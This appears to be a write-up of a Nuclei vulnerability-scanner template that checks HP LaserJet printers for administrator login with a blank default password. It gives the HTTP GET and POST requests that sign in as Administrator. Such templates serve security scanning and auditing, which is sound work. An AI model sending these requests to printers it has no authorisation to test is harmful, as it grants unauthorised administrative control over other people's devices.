# Nuclei Template: Hewlett Packard LaserJet Printer - Default Login
**Template ID:** hp-printer-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`hp-printer-default-login.yaml`)

## Vulnerability Information & PoC

## Description
HP printers often allow administrative access without requiring a password by default. This behavior enables anyone to log in as the Administrator without authentication, potentially exposing sensitive settings or functions.

## Steps to reproduce / Exploit Payload
```http
GET /hp/device/SignIn/Index HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: identity
Accept-Language: en

POST /hp/device/SignIn/Index HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: identity
Content-Type: application/x-www-form-urlencoded
Origin: {{RootURL}}
Referer: {{RootURL}}/hp/device/SignIn/Index

CSRFToken={{token}}&agentIdSelect=hp_EmbeddedPin_v1&PinDropDown=AdminItem&PasswordTextBox=&signInOk=Sign+In
```

## References
- https://h30434.www3.hp.com/t5/Printing-Errors-or-Lights-Stuck-Print-Jobs/What-is-the-user-name-and-password-in-Embedded-Web-Server/td-p/6165417
